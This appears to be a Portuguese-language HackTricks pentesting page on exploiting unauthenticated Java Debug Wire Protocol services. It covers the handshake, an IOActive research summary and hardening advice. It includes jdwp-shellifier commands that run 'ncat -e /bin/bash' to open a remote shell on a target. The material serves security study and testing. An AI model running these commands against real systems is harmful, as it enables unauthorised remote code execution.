# Pentesting JDWP - Protocolo de Depura√ß√£o Java (Java Debug Wire Protocol)

<details>

<summary><strong>Aprenda a hackear a AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Explora√ß√£o

A explora√ß√£o do JDWP depende da **falta de autentica√ß√£o e criptografia do protocolo**. Geralmente √© encontrado na **porta 8000**, mas outras portas s√£o poss√≠veis. A conex√£o inicial √© feita enviando um "JDWP-Handshake" para a porta de destino. Se um servi√ßo JDWP estiver ativo, ele responde com a mesma string, confirmando sua presen√ßa. Esse handshake atua como um m√©todo de identifica√ß√£o para identificar servi√ßos JDWP na rede.

Em termos de identifica√ß√£o de processos, a busca pela string "jdwk" em processos Java pode indicar uma sess√£o JDWP ativa.

A ferramenta padr√£o √© [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). Voc√™ pode us√°-lo com diferentes par√¢metros:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
Encontrei que o uso de `--break-on 'java.lang.String.indexOf'` torna o exploit mais **est√°vel**. E se voc√™ tiver a oportunidade de fazer upload de um backdoor para o host e execut√°-lo em vez de executar um comando, o exploit ser√° ainda mais est√°vel.

## Mais detalhes

**Este √© um resumo de [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Consulte para mais detalhes.


1. **Vis√£o Geral do JDWP**:
- √â um protocolo bin√°rio de rede baseado em pacotes, principalmente s√≠ncrono.
- Falta autentica√ß√£o e criptografia, tornando-o vulner√°vel quando exposto a redes hostis.

2. **Handshake do JDWP**:
- Um processo de handshake simples √© usado para iniciar a comunica√ß√£o. Uma string ASCII de 14 caracteres "JDWP-Handshake" √© trocada entre o Depurador (cliente) e o Debuggee (servidor).

3. **Comunica√ß√£o do JDWP**:
- As mensagens t√™m uma estrutura simples com campos como Comprimento, Id, Sinalizador e Conjunto de Comandos.
- Os valores do Conjunto de Comandos variam de 0x40 a 0x80, representando diferentes a√ß√µes e eventos.

4. **Explora√ß√£o**:
- O JDWP permite carregar e invocar classes e bytecode arbitr√°rios, representando riscos de seguran√ßa.
- O artigo detalha um processo de explora√ß√£o em cinco etapas, envolvendo a obten√ß√£o de refer√™ncias do Tempo de Execu√ß√£o do Java, defini√ß√£o de pontos de interrup√ß√£o e invoca√ß√£o de m√©todos.

5. **Explora√ß√£o na Vida Real**:
- Apesar das potenciais prote√ß√µes de firewall, os servi√ßos JDWP s√£o descobr√≠veis e explor√°veis em cen√°rios do mundo real, conforme demonstrado por pesquisas em plataformas como ShodanHQ e GitHub.
- O script de exploit foi testado em v√°rias vers√µes do JDK e √© independente de plataforma, oferecendo Execu√ß√£o Remota de C√≥digo (RCE) confi√°vel.

6. **Implica√ß√µes de Seguran√ßa**:
- A presen√ßa de servi√ßos JDWP abertos na internet destaca a necessidade de revis√µes de seguran√ßa regulares, desativa√ß√£o de funcionalidades de depura√ß√£o em produ√ß√£o e configura√ß√µes adequadas de firewall.


### **Refer√™ncias:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(n√£o mais ativo)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (n√£o mais ativo)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
